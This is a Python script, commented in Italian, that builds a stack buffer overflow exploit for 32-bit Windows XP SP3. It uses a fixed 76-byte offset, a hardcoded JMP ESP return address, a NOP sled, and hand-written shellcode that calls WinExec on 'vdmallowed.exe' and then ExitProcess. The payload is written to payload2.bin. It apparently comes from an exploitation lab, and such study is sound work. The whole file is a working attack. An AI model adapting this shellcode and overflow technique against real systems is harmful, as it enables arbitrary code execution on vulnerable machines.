import struct

# Build per Windows XP 32 bit SP3
JMP_ESP     = 0x7C86467B
WINEXEC     = 0x7C8623AD
EXITPROCESS = 0x7C81CAFA
OFFSET      = 76

# WinExec("vdmallowed.exe", 1) poi ExitProcess
# La stringa "vdmallowed.exe" viene pushata a blocchi di 4 byte sullo stack
# "vdmallowed.exe" = 14 char, non multiplo di 4, quindi si pusha con padding \x90 e si sistema dopo
shellcode = (
    b"\x31\xC9" +               # xor ecx, ecx
    b"\x51" +                   # push ecx         ; null terminator (00 00 00 00)
    b"\x68\x78\x65\x90\x90" +   # push 0x90906578  -> "xe" + padding \x90\x90
    b"\x68\x65\x64\x2E\x65" +   # push 0x652E6465  -> "ed.e"
    b"\x68\x6C\x6C\x6F\x77" +   # push 0x776F6C6C  -> "llow"
    b"\x68\x76\x64\x6D\x61" +   # push 0x616D6476  -> "vdma"
    b"\x8B\xC4" +               # mov eax, esp     ; puntatore a "vdmallowed.exe\x90\x90..."
    b"\x88\x48\x0E" +           # mov byte [eax+14], cl ; sovrascrive \x90 con \x00 (null terminator)
    b"\x6A\x01" +               # push 1           ; uCmdShow = visibile
    b"\x50" +                   # push eax         ; lpCmdLine
    b"\xBB" + struct.pack("<I", WINEXEC) +
    b"\xFF\xD3" +               # call WinExec
    b"\x31\xC9" +               # xor ecx, ecx
    b"\x51" +                   # push ecx         ; 0 per ExitProcess
    b"\xBB" + struct.pack("<I", EXITPROCESS) +
    b"\xFF\xD3"                 # call ExitProcess
)

payload = b"A" * OFFSET
payload += struct.pack("<I", JMP_ESP)
payload += b"\x90" * 4
payload += shellcode

with open("payload2.bin", "wb") as f:
    f.write(payload)